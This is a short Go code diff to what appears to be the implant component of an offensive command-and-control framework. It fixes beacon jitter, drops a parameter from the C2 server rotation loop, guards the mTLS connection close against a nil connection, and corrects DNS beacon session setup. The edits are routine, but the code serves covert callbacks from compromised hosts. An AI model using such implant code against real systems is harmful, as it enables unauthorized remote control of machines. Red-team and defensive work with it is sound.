@@ -103,7 +103,7 @@ func (b *Beacon) Duration() time.Duration {
 	// {{end}}
 	jitterDuration := time.Duration(0)
 	if 0 < b.Jitter() {
-		jitterDuration = time.Duration(int64(insecureRand.Intn(int(b.Jitter()))))
+		jitterDuration = time.Duration(insecureRand.Int63n(b.Jitter()))
 	}
 	duration := time.Duration(b.Interval()) + jitterDuration
 	// {{if .Config.Debug}}
@@ -113,7 +113,7 @@ func (b *Beacon) Duration() time.Duration {
 }
 
 // StartBeaconLoop - Starts the beacon loop generator
-func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
+func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Starting beacon loop ...")
 	// {{end}}
@@ -122,7 +122,7 @@ func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 	nextBeacon := make(chan *Beacon)
 
 	innerAbort := make(chan struct{})
-	c2Generator := C2Generator(c2s, innerAbort)
+	c2Generator := C2Generator(innerAbort)
 
 	go func() {
 		defer close(nextBeacon)
@@ -211,11 +211,13 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 			return mtls.WriteEnvelope(conn, envelope)
 		},
 		Close: func() error {
-			err = conn.Close()
-			if err != nil {
-				return err
+			if conn != nil {
+				err = conn.Close()
+				if err != nil {
+					return err
+				}
+				conn = nil
 			}
-			conn = nil
 			return nil
 		},
 		Cleanup: func() error {
@@ -341,7 +343,7 @@ func dnsBeacon(uri *url.URL) *Beacon {
 		ActiveC2: uri.String(),
 		Init: func() error {
 			opts := dnsclient.ParseDNSOptions(uri)
-			client, err = dnsclient.DNSStartSession(uri.Host, opts)
+			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] dns connection error %s", err)
